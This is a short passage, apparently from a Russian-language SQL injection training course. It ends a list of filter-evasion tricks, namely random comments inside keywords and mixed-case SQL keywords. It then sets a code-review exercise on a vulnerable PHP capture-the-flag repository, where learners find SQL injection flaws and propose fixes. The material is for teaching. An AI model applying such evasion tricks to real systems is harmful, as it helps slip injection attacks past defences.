- Добавляет случайные комментарии внутри ключевых слов
- Применяет mixed-case к SQL ключевым словам

### Задание 5: Code Review
Проведите код-ревью уязвимого PHP-приложения, выявите все SQLi и предложите исправления:
```bash
git clone https://github.com/orangetw/My-CTF-Web-Challenges.git
```
